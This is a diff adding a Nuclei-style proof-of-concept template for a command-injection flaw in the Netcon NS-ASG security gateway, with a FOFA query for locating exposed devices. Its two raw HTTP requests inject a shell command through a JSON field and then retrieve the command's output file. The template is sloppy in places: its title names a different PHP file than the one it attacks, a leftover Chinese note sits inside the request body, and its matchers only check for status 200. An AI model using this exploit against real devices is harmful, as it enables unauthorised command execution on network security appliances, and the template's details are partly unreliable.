@@ -1,0 +1,66 @@
+id: poc-sqvfqp9iq53ladup
+info:
+  name: 网康防火墙 setdevicetime.php命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sqvfqp9iq53ladup'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sqvfqp9iq53ladup
+    fofa: title="网康 NS-ASG 应用安全网关"
+http:
+- raw:
+  - 'POST /protocol/index.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+
+    Content-Length: 75
+
+    Accept: text/html, application/xhtml+xml, image/jxr, */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+
+    Ua-Cpu: AMD64
+
+    jsoncontent={"protocolType":"addipsec","messagecontent":"1\";id>22.txt;\""}
+
+    2.访问得到结果'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /protocol/22.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+
+    Accept: text/html, application/xhtml+xml, image/jxr, */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+
+    Connection: close
+
+    Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+
+    Ua-Cpu: AMD64'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
